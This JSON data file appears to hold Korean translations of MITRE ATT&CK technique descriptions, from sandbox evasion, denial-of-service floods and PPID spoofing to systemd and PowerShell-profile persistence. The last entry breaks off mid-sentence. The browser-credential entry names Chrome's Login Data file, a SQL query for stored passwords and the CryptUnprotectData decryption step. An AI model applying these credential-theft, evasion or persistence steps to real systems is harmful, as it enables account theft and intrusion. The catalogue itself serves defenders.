      "description": "적대자는 가상화 및 분석 환경을 탐지하고 회피하기 위해 다양한 시스템 점검을 수행할 수 있습니다. 이러한 점검은 가상 머신 환경(VME) 또는 샌드박스를 나타내는 아티팩트의 존재에 대한 점검 결과에 따라 행동을 변경하는 것을 포함할 수 있습니다. 만약 적대자가 VME를 탐지하면, 그들은 피해자로부터 분리되거나 심부 기능을 숨기기 위해 악성 코드를 수정할 수 있습니다. 또한, 그들은 추가적인 페이로드를 배포하기 전에 VME 아티팩트를 검색할 수 있습니다. 적대자는 [가상화/샌드박스 회피](https://attack.mitre.org/techniques/T1497)에서 배운 정보를 이후 행동을 형성하는 데 사용할 수 있습니다.(출처: Deloitte Environment Awareness)\n\n특정 점검은 목표와/또는 적대자에 따라 다를 수 있지만, [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), 및 [Query Registry](https://attack.mitre.org/techniques/T1012)와 같은 행동을 포함하여 시스템 정보를 수집하고 VME 아티팩트를 검색할 수 있습니다. 적대자는 메모리, 프로세스, 파일 시스템, 하드웨어, 및/또는 레지스트리에서 VME 아티팩트를 검색할 수 있습니다. 적대자는 이러한 점검을 하나의 스크립트로 자동화하여, 시스템이 가상 환경으로 판별될 경우 프로그램을 종료할 수 있습니다.\n\n점검은 호스트/도메인 이름과 네트워크 트래픽 샘플과 같은 일반적인 시스템 속성을 포함할 수 있습니다. 적대자는 네트워크 어댑터 주소, CPU 코어 수, 사용 가능한 메모리/드라이브 크기도 확인할 수 있습니다. 악성 코드가 실행된 후에는 [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)를 사용하여 의외의 이름이나 분석 관련 이름을 가진 폴더 또는 파일에 저장되었는지 확인할 수도 있습니다. 예를 들어 “악성 코드”, “샘플”, 또는 “해시”와 같은 이름이 해당됩니다.\n\n기타 일반적인 점검은 이러한 응용 프로그램에 고유한 실행 중인 서비스, 시스템에 설치된 프로그램, 가상 머신 응용 프로그램과 관련된 문자열의 제조업체/제품 필드를 나열하고, VME 특정 하드웨어/프로세서 명령을 확인하는 것을 포함할 수 있습니다.(출처: McAfee Virtual Jan 2017) VMWare와 같은 응용 프로그램에서는 적대자가 특별한 I/O 포트를 사용하여 명령을 보내고 출력을 받을 수도 있습니다.\n\n팬, 온도, 및 오디오 장치의 존재와 같은 하드웨어 점검은 가상 환경을 나타낼 수 있는 증거를 수집하는 데 사용될 수 있습니다. 적대자는 이러한 장치로부터 특정 판독값을 조회할 수도 있습니다.(출처: Unit 42 OilRig Sept 2018)",
      "external_id": "T1497.001",
      "modified": "2024-09-12T15:50:18.047Z",
      "title": "System Checks",
      "translated": true
    },
    {
      "description": "적대자는 가상화 및 분석 환경을 탐지하고 회피하기 위해 다양한 사용자 활동 검사를 사용할 수 있습니다. 이는 가상 머신 환경(VME) 또는 샌드박스의 존재를 나타내는 인공물의 체크 결과에 따라 행동을 변경하는 것을 포함할 수 있습니다. 만약 적대자가 VME를 감지하면, 그들은 피해자와의 연결을 끊거나 임플란트의 핵심 기능을 숨기기 위해 그들의 악성코드를 수정할 수 있습니다. 또한, 그들은 추가적인 페이로드를 투하하기 전에 VME 인공물을 검색할 수 있습니다. 적대자는 자동화된 탐색 동안 [가상화/샌드박스 회피](https://attack.mitre.org/techniques/T1497)에서 배운 정보를 사용하여 후속 행동을 형성할 수 있습니다. (출처: Deloitte 환경 인식)\n\n적대자는 마우스 움직임과 클릭의 속도/빈도, 브라우저 기록, 캐시, 즐겨찾기 또는 홈이나 바탕화면과 같은 일반 디렉토리에 있는 파일 수와 같은 변수를 기반으로 호스트에서 사용자 활동을 탐색할 수 있습니다. 다른 방법들은 악성 코드가 활성화되기 전에 시스템과의 특정 사용자 상호작용에 의존할 수 있으며, 예를 들어 문서가 닫힐 때까지 기다렸다가 매크로를 활성화하거나, 사용자에게 내장된 이미지를 더블 클릭하도록 기다려서 활성화하는 것을 포함합니다. (출처: Unit 42 Sofacy 2018년 11월, FireEye FIN7 2017년 4월)",
      "external_id": "T1497.002",
      "modified": "2024-09-12T15:50:18.050Z",
      "title": "User Activity Based Checks",
      "translated": true
    },
    {
      "description": "상대방은 가상화 및 분석 환경을 탐지하고 회피하기 위해 다양한 시간 기반 방법을 사용할 수 있습니다. 여기에는 가동 시간이나 시스템 시계와 같은 시간 기반 속성을 나열하거나, 가상 머신 환경(VME)이나 샌드박스를 회피하기 위해 타이머 또는 기타 트리거를 사용하는 것이 포함됩니다. 특히 자동화된 샌드박스나 제한된 시간 동안만 작동하는 샌드박스를 회피하는 것을 목적으로 합니다.\n\n상대방은 프로그램적 수면 명령이나 네이티브 시스템 스케줄링 기능(예: [예약 작업/작업](https://attack.mitre.org/techniques/T1053))을 사용하여 초기 실행 시 맬웨어 기능을 지연시키는 다양한 시간 기반 회피 방법을 사용할 수 있습니다. 지연은 특정 피해자 조건(예: 시스템 시간, 이벤트 등)이 충족될 때까지 기다리거나 분석 및 검토를 피하기 위해 예정된 [다단계 채널](https://attack.mitre.org/techniques/T1104)을 활용하는 방식으로 발생할 수 있습니다. (출처: Deloitte 환경 인식)\n\n무해한 명령어나 기타 작업도 맬웨어 실행을 지연시키는 데 사용될 수 있습니다. [Ping](https://attack.mitre.org/software/S0097)과 같은 명령어의 루프 또는 불필요한 반복이 맬웨어 실행을 지연시키고 자동화된 분석 환경의 시간 임계값을 초과하도록 할 수 있습니다. (출처: Revil Independence Day) (출처: Netskope Nitol) 또 다른 변형은 일반적으로 API 해머링이라고 불리며, 실행을 지연시키기 위해 다양한 [네이티브 API](https://attack.mitre.org/techniques/T1106) 함수 호출을 하여 (또한 분석 환경을 정크 데이터로 과부하시키는 방식) 실행을 지연시키는 것입니다. (출처: Joe Sec Nymaim) (출처: Joe Sec Trickbot)\n\n상대방은 또한 샌드박스 및 분석 환경을 탐지하기 위한 기준으로 시간을 사용할 수 있으며, 특히 시간이 흐르는 것을 시뮬레이션하기 위해 시간 메커니즘을 조작하려는 경우 더욱 그렇습니다. 예를 들어, 상대방은 수면 함수 실행 전후의 환경 타임스탬프의 예상 값을 샘플링하고 계산하여 시간을 가속하는 샌드박스를 식별할 수 있습니다. (출처: ISACA 맬웨어 트릭)",
      "external_id": "T1497.003",
      "modified": "2024-09-12T15:50:18.048Z",
      "title": "Time Based Evasion",
      "translated": true
    },
    {
      "description": "적대적 행위자는 네트워크 서비스 거부(DoS) 공격을 수행하여 타겟 리소스에 대한 사용자들의 가용성을 저하시킬 수 있습니다. 네트워크 DoS 공격은 서비스가 의존하는 네트워크 대역폭을 소모함으로써 수행될 수 있습니다. 예시 리소스에는 특정 웹사이트, 이메일 서비스, DNS, 그리고 웹 기반 응용 프로그램이 포함됩니다. 적대적 행위자는 정치적 목적(Citation: FireEye OpPoisonedHandover 2016년 2월)과 주의 분산을 포함한 다른 악의적 활동을 지원하기 위해 네트워크 DoS 공격을 수행하는 것이 관찰되었습니다(Citation: FSISAC FraudNetDoS 2012년 9월), 해킹 활동 및 갈취와 같은 것들(Citation: Symantec DDoS 2014년 10월).\n\n네트워크 DoS 공격은 리소스 또는 리소스가 의존하는 네트워크 연결 및 네트워크 장치에 대한 악의적인 트래픽의 양으로 인해 시스템에 대한 네트워크 연결의 대역폭 용량이 소진될 때 발생합니다. 예를 들어, 적대적 행위자는 1Gbps의 인터넷 연결을 가진 네트워크에서 호스팅되는 서버에 10Gbps의 트래픽을 전송할 수 있습니다. 이 트래픽은 단일 시스템이나 인터넷 전역에 분산된 여러 시스템에 의해 생성될 수 있으며, 이를 일반적으로 분산 서비스 거부(DDoS)라고 합니다.\n\n네트워크 DoS 공격을 수행하기 위해 여러 방법에 적용되는 여러 측면이 있으며, 여기에는 IP 주소 스푸핑과 봇넷이 포함됩니다.\n\n적대적 행위자는 공격 시스템의 원래 IP 주소를 사용할 수도 있고, 공격 트래픽을 추적하기 어렵게 만들거나 반사를 가능하게 하기 위해 출발지 IP 주소를 스푸핑할 수도 있습니다. 이는 네트워크 방어 장치에서 출발지 주소에 의한 필터링의 효과를 감소시키거나 제거하여 방어자가 공격으로부터 방어하는 데 어려움을 겪게 할 수 있습니다.\n\n호스팅 시스템을 직접적으로 목표로 하는 DoS 공격에 대한 자세한 내용은 [엔드포인트 서비스 거부](https://attack.mitre.org/techniques/T1499)를 참조하십시오.",
      "external_id": "T1498",
      "modified": "2024-10-15T16:01:00.510Z",
      "title": "Network Denial of Service",
      "translated": true
    },
    {
      "description": "공격자는 목표 대상에 대량의 네트워크 트래픽을 직접 전송하여 서비스 거부 공격(DoS)을 유발하려고 시도할 수 있습니다. 이러한 DoS 공격은 대상 시스템과 네트워크의 가용성과 기능성을 저하시킬 수 있습니다. [직접 네트워크 플러딩](https://attack.mitre.org/techniques/T1498/001)은 하나 이상의 시스템이 목표 서비스의 네트워크로 대량의 네트워크 패킷을 전송하는 경우를 말합니다. 거의 모든 네트워크 프로토콜이 플러딩에 사용될 수 있습니다. UDP나 ICMP와 같은 상태 비저장 프로토콜이 일반적으로 사용되지만, TCP와 같은 상태 저장 프로토콜도 사용될 수 있습니다.\n\n봇넷은 네트워크와 서비스에 대한 네트워크 플러딩 공격을 수행하는 데 일반적으로 사용됩니다. 대규모 봇넷은 전 세계 인터넷에 분산된 시스템으로부터 상당한 양의 트래픽을 생성할 수 있습니다. 공격자는 자신의 봇넷 인프라를 구축하고 제어할 자원을 가질 수도 있고, 공격을 수행하기 위해 기존 봇넷의 시간을 임대할 수도 있습니다. 분산 서비스 거부 공격(DDoS)의 최악의 경우에는, 너무 많은 시스템이 플러드를 생성하는 데 사용되어 각각이 목표 네트워크를 포화시키기 위해 소량의 트래픽만 전송하면 되는 상황이 발생할 수 있습니다. 이러한 상황에서는 DDoS 트래픽과 정당한 클라이언트를 구별하는 것이 매우 어려워집니다. 봇넷은 2012년 주요 미국 은행을 대상으로 한 일련의 공격과 같은 가장 높은 프로필의 DDoS 플러딩 공격에 사용되었습니다. (인용: USNYAG 이란 봇넷 2016년 3월)",
      "external_id": "T1498.001",
      "modified": "2024-10-15T15:54:49.943Z",
      "title": "Direct Network Flood",
      "translated": true
    },
    {
      "description": "공격자는 표적에게 고용량의 네트워크 트래픽을 반사시켜 서비스 거부(DoS)를 유발하려고 시도할 수 있습니다. 이러한 유형의 네트워크 DoS는 주어진 스푸핑된 소스 IP 주소에 응답하는 제3자 서버 중개자를 활용합니다. 이 제3자 서버는 일반적으로 리플렉터(reflector)라고 불립니다. 공격자는 피해자의 스푸핑된 주소를 가진 패킷을 리플렉터로 전송함으로써 반사 공격을 수행합니다. 직접 네트워크 플러드와 유사하게, 하나 이상의 시스템을 사용하여 공격을 수행하거나 봇넷을 사용할 수 있습니다. 마찬가지로, 하나 이상의 리플렉터를 사용하여 표적에 트래픽을 집중시킬 수 있습니다. (인용문: Cloudflare ReflectionDoS, 2017년 5월) 이 네트워크 DoS 공격은 또한 표적 시스템 및 네트워크의 가용성 및 기능을 감소시킬 수 있습니다.\n\n반사 공격은 일반적으로 요청보다 응답이 더 큰 프로토콜을 활용하여 트래픽을 증폭시키며, 이를 보통 반사 증폭 공격(Reflection Amplification attack)이라고 합니다. 공격자는 증폭 장치에 전송된 요청보다 몇 배 더 높은 공격 트래픽의 볼륨을 생성할 수 있습니다. 이 증가의 정도는 해당 프로토콜, 사용된 기법, 실제로 공격 볼륨의 증폭을 발생시키는 증폭 서버와 같은 여러 변수에 따라 달라집니다. 반사 증폭 플러드를 가능하게 하는 두 가지 주요 프로토콜은 DNS(인용문: Cloudflare DNSamplficationDoS)와 NTP(인용문: Cloudflare NTPamplifciationDoS)이며, 여러 다른 프로토콜의 사용도 기록되어 있습니다. (인용문: Arbor AnnualDoSreport, 2018년 1월) 특히, 메모리 캐시 프로토콜(memcache)은 요청 패킷에 비해 최대 51,200배의 증폭 크기를 보여주며 강력한 프로토콜로 입증되었습니다. (인용문: Cloudflare Memcrashed, 2018년 2월)",
      "external_id": "T1498.002",
      "modified": "2024-10-15T16:04:34.495Z",
      "title": "Reflection Amplification",
      "translated": true
    },
    {
      "description": "적대자들은 사용자에게 서비스의 가용성을 저하시거나 차단하기 위해 엔드포인트 서비스 거부(DoS) 공격을 수행할 수 있습니다. 엔드포인트 DoS는 이러한 서비스가 호스팅되는 시스템 자원을 소모시키거나 시스템을 악용하여 지속적인 크래시 상태를 유발함으로써 수행될 수 있습니다. 예시 서비스에는 웹사이트, 이메일 서비스, DNS 및 웹 기반 애플리케이션이 포함됩니다. 적대자들은 정치적 목적(Citation: FireEye OpPoisonedHandover 2016년 2월)과 주의 전환을 포함한 다른 악의적 활동을 지원하기 위해 DoS 공격을 수행하는 것이 관찰되었습니다.(Citation: FSISAC FraudNetDoS 2012년 9월) 해커 운동이나 강요 등도 포함됩니다.(Citation: Symantec DDoS 2014년 10월)\n\n엔드포인트 DoS는 서비스에 대한 가용성을 차단하지만 서비스를 제공하는 데 사용되는 네트워크를 포화시키지 않습니다. 적대자들은 서비스를 제공하는 데 사용되는 시스템에 호스팅된 애플리케이션 스택의 다양한 계층을 목표로 삼을 수 있습니다. 이러한 계층에는 운영 체제(OS), 웹 서버, DNS 서버, 데이터베이스 및 그 위에 위치한(일반적으로 웹 기반) 애플리케이션이 포함됩니다. 각 계층을 공격하기 위해서는 해당 구성 요소에 고유한 병목 현상을 이용하는 다양한 기술이 필요합니다. DoS 공격은 단일 시스템 또는 인터넷에 분산된 여러 시스템에 의해 생성될 수 있으며, 이는 일반적으로 분산 서비스 거부(DDoS)로 알려져 있습니다.\n\n엔드포인트 자원에 대한 DoS 공격을 수행하기 위해서는 IP 주소 스푸핑 및 봇넷을 포함한 여러 방법이 적용됩니다.\n\n적대자들은 공격 시스템의 원래 IP 주소를 사용할 수 있으며, 공격 트래픽을 공격 시스템으로 추적하기 더 어렵게 만들거나 반사를 가능하게 하기 위해 소스 IP 주소를 스푸핑할 수 있습니다. 이렇게 하면 네트워크 방어 장치에서 소스 주소에 의한 필터링의 효과를 줄이거나 없애서 방어자가 공격을 방어하는 데 어려움이 커질 수 있습니다.\n\n봇넷은 네트워크 및 서비스에 대한 DDoS 공격을 수행하는 데 일반적으로 사용됩니다. 대규모 봇넷은 전 세계 인터넷에 분산된 시스템으로부터 상당한 양의 트래픽을 생성할 수 있습니다. 적대자들은 자신의 봇넷 인프라를 구축하고 제어할 자원을 가질 수 있거나 기존 봇넷에서 공격을 수행하기 위해 시간을 임대할 수 있습니다. DDoS의 최악의 경우, 요청을 생성하는 데 너무 많은 시스템이 사용되어 각 시스템이 목표의 자원을 소모하기에 충분한 양을 생성하기 위해 작은 양의 트래픽만 보내면 됩니다. 이러한 경우 DDoS 트래픽과 합법적인 클라이언트를 구분하는 것이 매우 어려워집니다. 봇넷은 2012년에 주요 미국 은행을 겨냥한 일련의 DDoS 공격과 같은 가장 고프로파일의 DDoS 공격에서도 사용되었습니다.(Citation: USNYAG IranianBotnet 2016년 3월)\n\n트래픽 조작이 사용되는 경우 전 세계 네트워크의 일부 지점(예: 고트래픽 게이트웨이 라우터)에서 패킷이 변경되어 합법적인 클라이언트가 네트워크 패킷을 높은 양으로 목표로 보내도록 코드가 실행되도록 할 수 있습니다. 이러한 능력은 클라이언트 HTTP 트래픽이 DDoS 코드를 생성하는 JavaScript 참조를 포함하도록 수정되었던 웹 검열의 목적으로 이전에 사용되었습니다.(Citation: ArsTechnica Great Firewall of China)\n\n제공하는 네트워크를 포화시키려는 공격에 대한 내용은 [네트워크 서비스 거부](https://attack.mitre.org/techniques/T1498)를 참조하십시오.",
      "external_id": "T1499",
      "modified": "2024-10-15T15:56:47.424Z",
      "title": "Endpoint Denial of Service",
      "translated": true
    },
    {
      "description": "공격자는 엔드포인트의 운영 체제(OS)를 목표로 하는 서비스 거부(DoS) 공격을 시작할 수 있습니다. 시스템의 OS는 제한된 리소스를 관리하며 과도한 요구로 인해 전체 시스템이 압도당하지 않도록 방지하는 역할을 합니다. 이러한 공격은 시스템의 실제 리소스를 소진할 필요가 없으며, OS가 자가 부과한 한계와 사용 가능한 리소스만 소모할 수 있습니다.\n\n이를 달성할 수 있는 다양한 방법이 있으며, 여기에는 TCP 상태 소모 공격인 SYN 플러드 및 ACK 플러드가 포함됩니다. SYN 플러드 공격에서는 과도한 양의 SYN 패킷이 전송되지만 3-way TCP 핸드셰이크가 완료되지 않습니다. 각 OS는 허용할 수 있는 동시 TCP 연결 수에 최대 한도가 있기 때문에, 이는 시스템이 새로운 TCP 연결 요청을 수신할 수 있는 능력을 빠르게 소진시켜 서버가 제공하는 모든 TCP 서비스에 대한 접근을 차단할 수 있습니다.\n\nACK 플러드는 TCP 프로토콜의 상태 유지 특성을 활용합니다. 목적지에 ACK 패킷이 대량으로 전송됩니다. 이는 OS가 이미 설정된 관련 TCP 연결을 찾기 위해 상태 테이블을 검색하도록 강제합니다. ACK 패킷이 존재하지 않는 연결에 대한 것이기 때문에, OS는 일치하는 항목이 존재하지 않음을 확인하기 위해 전체 상태 테이블을 검색해야 합니다. 대량의 패킷으로 이를 수행해야 할 경우, 이로 인해 서버의 계산 요구량이 증가하여 서버가 느려지거나 응답이 없게 될 수 있습니다. 이로 인해 제공할 수 있는 서비스에 대한 가용 리소스가 크게 감소합니다.",
      "external_id": "T1499.001",
      "modified": "2023-03-30T21:01:51.289Z",
      "title": "OS Exhaustion Flood",
      "translated": true
    },
    {
      "description": "적대자는 서비스를 제공하는 시스템의 다양한 네트워크 서비스를 목표로 하여 서비스 거부(DoS) 공격을 수행할 수 있습니다. 적대자는 종종 DNS와 웹 서비스의 가용성을 목표로 하지만, 다른 서비스들도 공격의 대상이 될 수 있습니다. (인용: Arbor Annual DoS report Jan 2018) 웹 서버 소프트웨어는 다양한 방법으로 공격당할 수 있으며, 일부는 일반적으로 적용되지만 일부는 서비스를 제공하는 데 사용되는 소프트웨어에 특정적입니다.\n\n이러한 유형의 공격의 한 예는 단순 HTTP 플러드로 알려져 있으며, 공격자는 웹 서버에 대량의 HTTP 요청을 보내 서버와 그 위에서 실행되는 응용 프로그램을 압도하게 됩니다. 이 플러드는 목표를 달성하기 위해 원시 양에 의존하며, 피해 소프트웨어가 서비스를 제공하는 데 필요한 다양한 자원을 소모하게 됩니다. (인용: Cloudflare HTTP flood)\n\n또 다른 변형으로, SSL 재협상 공격이 있으며 이는 SSL/TLS의 프로토콜 기능을 이용합니다. SSL/TLS 프로토콜 스위트는 클라이언트와 서버가 향후 안전한 연결을 위한 암호화 알고리즘에 동의할 수 있는 메커니즘을 포함하고 있습니다. SSL 재협상이 활성화되어 있으면 암호 알고리즘의 재협상을 요청할 수 있습니다. 재협상 공격에서는 적대자가 SSL/TLS 연결을 설정한 다음 일련의 재협상 요청을 진행합니다. 암호학적 재협상은 계산 사이클에서 의미 있는 비용이 발생하므로, 대량으로 진행될 경우 서비스의 가용성에 영향을 미칠 수 있습니다. (인용: Arbor SSL DoS April 2012)",
      "external_id": "T1499.002",
      "modified": "2024-10-15T16:05:48.014Z",
      "title": "Service Exhaustion Flood",
      "translated": true
    },
    {
      "description": "적대자들은 애플리케이션의 리소스 집약적인 기능을 타겟으로 삼아 서비스 거부(DoS)를 일으킬 수 있으며, 이로 인해 해당 애플리케이션의 가용성을 저해할 수 있습니다. 예를 들어, 웹 애플리케이션의 특정 기능은 매우 리소스를 많이 소모할 수 있습니다. 이러한 기능에 대한 반복적인 요청은 시스템 리소스를 고갈시켜 애플리케이션이나 서버 자체에 대한 접근을 차단할 수 있습니다. (출처: Arbor Annual DoS report Jan 2018)",
      "external_id": "T1499.003",
      "modified": "2024-10-15T15:41:49.168Z",
      "title": "Application Exhaustion Flood",
      "translated": true
    },
    {
      "description": "적대자는 애플리케이션이나 시스템에 충돌을 일으킬 수 있는 소프트웨어 취약점을 악용하여 사용자에게 가용성을 차단할 수 있습니다. (출처: Sucuri BIND9 2015년 8월) 일부 시스템은 충돌이 발생할 경우 중요한 애플리케이션과 서비스를 자동으로 재시작할 수 있지만, 이는 지속적인 서비스 거부(DoS) 상태를 초래하기 위해 재악용될 가능성이 큽니다.\n\n적대자는 알려진 취약점이나 제로데이 취약점을 악용하여 애플리케이션 및/또는 시스템을 충돌시킬 수 있으며, 이는 그에 의존하는 애플리케이션 및/또는 시스템이 DoS 상태가 되는 결과를 초래할 수 있습니다. 충돌하거나 재시작된 애플리케이션 또는 시스템은 [데이터 파손](https://attack.mitre.org/techniques/T1485), [펌웨어 손상](https://attack.mitre.org/techniques/T1495), [서비스 중단](https://attack.mitre.org/techniques/T1489) 등과 같은 다른 영향도 미칠 수 있어, 이는 더 나아가 DoS 상태를 초래하고 중요한 정보, 애플리케이션 및/또는 시스템에 대한 가용성을 차단할 수 있습니다.",
      "external_id": "T1499.004",
      "modified": "2024-10-15T15:42:23.001Z",
      "title": "Application or System Exploitation",
      "translated": true
    },
    {
      "description": "적대자는 파일을 컴파일되지 않은 코드 형태로 피해자에게 전달하여 페이로드를 발견하고 분석하기 어렵게 만들 수 있습니다. 이는 [모호한 파일 또는 정보](https://attack.mitre.org/techniques/T1027)와 유사하게, 텍스트 기반 소스 코드 파일이 실행 파일/바이너리를 타겟으로 하는 보호 장치의 분석 및 점검을 우회할 수 있습니다. 이러한 페이로드는 실행 전에 컴파일되어야 하며, 일반적으로 csc.exe 또는 GCC/MinGW와 같은 네이티브 유틸리티를 통해 이루어집니다.(인용: ClearSky MuddyWater Nov 2018)\n\n소스 코드 페이로드는 또한 암호화되거나 인코딩되거나, [스피어피싱 첨부파일](https://attack.mitre.org/techniques/T1193)과 같은 다른 파일에 내장되어 전달될 수 있습니다. 페이로드는 또한 네이티브 OS에 의해 인식되지 않거나 본질적으로 무해한 형식(예: macOS/Linux에서의 EXE)으로 전달된 후, 나중에 적절한 실행 파일 바이너리로 (재)컴파일될 수 있는 번들된 컴파일러 및 실행 프레임워크와 함께 제공됩니다.(인용: TrendMicro WindowsAppMac)",
      "external_id": "T1500",
      "modified": "2020-03-16T15:38:37.650Z",
      "title": "Compile After Delivery",
      "translated": true
    },
    {
      "description": "Systemd 서비스는 Linux 시스템에서 지속성을 수립하는 데 사용될 수 있습니다. systemd 서비스 관리자는 일반적으로 백그라운드 데몬 프로세스(서비스라고도 함) 및 기타 시스템 리소스를 관리하는 데 사용됩니다. (참고: Linux man-pages: systemd 2014년 1월) (참고: Freedesktop.org Linux systemd 2018년 9월 29일) systemd는 Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15 등 많은 Linux 배포판의 기본 초기화(init) 시스템으로, SysVinit 및 Upstart와 같은 기존의 초기화 시스템을 대체하면서도 이전의 초기화 시스템과 호환성을 유지합니다.\n\nSystemd는 서비스가 부팅되는 방식과 조건을 제어하는 데 사용되는 서비스 단위라는 구성 파일을 활용합니다. 기본적으로 이러한 단위 파일은 <code>/etc/systemd/system</code> 및 <code>/usr/lib/systemd/system</code> 디렉토리에 저장되며 파일 확장자는 <code>.service</code>입니다. 각 서비스 단위 파일에는 시스템 명령을 실행할 수 있는 여러 지시어가 포함될 수 있습니다.\n\n* ExecStart, ExecStartPre 및 ExecStartPost 지시어는 서비스가 'systemctl'에 의해 수동으로 시작되거나 서비스가 자동으로 시작되도록 설정된 경우 시스템 시작 시 명령이 실행될 때를 다룹니다.\n* ExecReload 지시어는 서비스가 재시작될 때를 다룹니다.\n* ExecStop 및 ExecStopPost 지시어는 서비스가 중지되거나 'systemctl'에 의해 수동으로 중지될 때를 다룹니다.\n\n적대 행위자는 피해 시스템에 지속적인 접근을 수립하기 위해 서비스 단위 파일을 생성하거나 수정하여 systemd가 시스템 부팅 시와 같이 주기적으로 악성 명령을 실행하도록 했습니다. (참고: Anomali Rocke 2019년 3월) (참고: gist Arch 패키지 손상 2018년 7월 10일) (참고: Arch Linux 패키지 systemd 손상 BleepingComputer 2018년 7월 10일) (참고: acroread 패키지 손상 Arch Linux Mail 2018년 7월 8일)\n\n적대 행위자는 일반적으로 <code>/etc/systemd/system</code> 및 <code>/usr/lib/systemd/system</code> 디렉토리에서 서비스 단위 파일을 생성하거나 수정하기 위해 루트 권한이 필요하지만, 낮은 권한의 사용자는 <code>~/.config/systemd/user/</code>와 같은 디렉토리에서 서비스 단위 파일을 생성하거나 수정하여 사용자 수준의 지속성을 달성할 수 있습니다. (참고: Rapid7 서비스 지속성 2016년 6월 22일)",
      "external_id": "T1501",
      "modified": "2020-01-17T16:51:52.027Z",
      "title": "Systemd Service",
      "translated": true
    },
    {
      "description": "적대자는 프로세스 모니터링 방어를 회피하거나 권한을 상승시키기 위해 새로운 프로세스의 부모 프로세스 식별자(PPID)를 스푸핑할 수 있습니다. 새로운 프로세스는 일반적으로 부모 또는 호출 프로세스에서 직접 생성되며, 명시적으로 지정되지 않는 한 그렇습니다. 새로운 프로세스의 PPID를 명시적으로 할당하는 한 가지 방법은 <code>CreateProcess</code> API 호출을 사용하는 것입니다. 이 호출은 사용할 PPID를 정의하는 매개변수를 지원합니다. (출처: DidierStevens SelectMyParent Nov 2009) 이 기능은 Windows의 사용자 계정 컨트롤(UAC)과 같은 기능에서 사용되어, 요청된 상승 프로세스가 SYSTEM(일반적으로 <code>svchost.exe</code> 또는 <code>consent.exe</code>를 통해)으로 생성된 후 올바른 PPID를 설정합니다. (출처: Microsoft UAC Nov 2018)\n\n적대자는 이러한 메커니즘을 남용하여, Office 문서에서 직접 프로세스 생성 차단과 같은 방어를 회피하고, PPID를 스푸핑하여 [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085)가 Office 문서가 아닌 <code>explorer.exe</code>인 경우와 같은 비정상적이거나 잠재적으로 악의적인 부모-자식 프로세스 관계를 타겟으로 하는 분석을 회피할 수 있습니다. (출처: CounterCept PPID Spoofing Dec 2018) 이 스푸핑은 악성 Office 문서 내에서 VBA [스크립팅](https://attack.mitre.org/techniques/T1064)을 통해 또는 [Native API](https://attack.mitre.org/techniques/T1106)를 수행할 수 있는 코드로 실행될 수 있습니다. (출처: CTD PPID Spoofing Macro Mar 2019)(출처: CounterCept PPID Spoofing Dec 2018)\n\nPPID를 명시적으로 할당하는 것은 [권한 상승](https://attack.mitre.org/tactics/TA0004)을 가능하게 할 수 있습니다(부모 프로세스에 대한 적절한 접근 권한이 있을 경우). 예를 들어, 특정한 권한이 있는 사용자 컨텍스트(예: 관리자)에 있는 적대자가 새로운 프로세스를 생성하고 부모를 SYSTEM으로 실행 중인 프로세스(예: <code>lsass.exe</code>)로 할당할 수 있으며, 이 경우 새로운 프로세스는 상속된 접근 토큰을 통해 승격됩니다. (출처: XPNSec PPID Nov 2017)",
      "external_id": "T1502",
      "modified": "2020-02-18T18:23:31.546Z",
      "title": "Parent PID Spoofing",
      "translated": true
    },
    {
      "description": "공격자는 특정 대상 웹 브라우저에 대한 파일을 읽어 웹 브라우저에서 자격 증명을 취득할 수 있습니다. (출처: Talos Olympic Destroyer 2018)\n\n웹 브라우저는 일반적으로 웹사이트의 사용자 이름과 비밀번호와 같은 자격 증명을 저장하여 나중에 수동으로 입력할 필요가 없도록 합니다. 웹 브라우저는 일반적으로 자격 증명을 암호화된 형식으로 자격 증명 저장소에 저장하지만, 웹 브라우저에서 평문 자격 증명을 추출하는 방법도 존재합니다.\n\n예를 들어, Windows 시스템에서 Google Chrome의 경우, 암호화된 자격 증명은 다음 데이터베이스 파일인 <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code>를 읽고 SQL 쿼리를 실행하여 얻을 수 있습니다: <code>SELECT action_url, username_value, password_value FROM logins;</code>. 그런 다음 암호화된 자격 증명을 Windows API 함수 <code>CryptUnprotectData</code>에 전달하여 평문 비밀번호를 얻을 수 있으며, 이 함수는 피해자의 캐시된 로그인 자격 증명을 복호화 키로 사용합니다. (출처: Microsoft CryptUnprotectData April 2018)\n\n공격자는 FireFox, Safari, Edge 등과 같은 일반 웹 브라우저에 대해서도 유사한 절차를 실행한 바 있습니다. (출처: Proofpoint Vega Credential Stealer May 2018)(출처: FireEye HawkEye Malware July 2017)\n\n공격자는 또한 웹 브라우저 프로세스 메모리에서 일반적으로 자격 증명과 일치하는 패턴을 검색하여 자격 증명을 취득할 수 있습니다. (출처: GitHub Mimikittenz July 2016)\n\n웹 브라우저에서 자격 증명을 취득한 후, 공격자는 이러한 자격 증명을 서로 다른 시스템 및/또는 계정에서 재사용하여 접근 범위를 확장하려고 시도할 수 있습니다. 이는 웹 브라우저에서 얻은 자격 증명이 특권 계정(예: 도메인 관리자)과 겹칠 경우, 공격자의 목표를 상당히 진전시킬 수 있습니다.",
      "external_id": "T1503",
      "modified": "2020-11-17T16:03:55.549Z",
      "title": "Credentials from Web Browsers",
      "translated": true
    },
    {
      "description": "적대자는 특정 상황에서 [PowerShell](https://attack.mitre.org/techniques/T1086) 프로필을 악용하여 지속성을 얻고 권한을 상승시킬 수 있습니다. PowerShell 프로필(<code>profile.ps1</code>)은 PowerShell이 시작될 때 실행되는 스크립트로, 사용자 환경을 사용자 정의하기 위한 로그온 스크립트로 사용될 수 있습니다. PowerShell은 사용자나 호스트 프로그램에 따라 여러 프로필을 지원합니다. 예를 들어, PowerShell 콘솔, PowerShell ISE 또는 Visual Studio Code와 같은 PowerShell 호스트 프로그램마다 다른 프로필이 있을 수 있습니다. 관리자는 로컬 컴퓨터의 모든 사용자 및 호스트 프로그램에 적용되는 프로필을 구성할 수도 있습니다. (인용: Microsoft 프로필 소개)\n\n적대자는 이러한 프로필을 수정하여 임의의 명령, 함수, 모듈 및/또는 PowerShell 드라이브를 포함시켜 지속성을 확보할 수 있습니다. 사용자가 PowerShell 세션을 열 때마다 수정된 스크립트가 실행되며, 이를 방지하려면 실행할 때 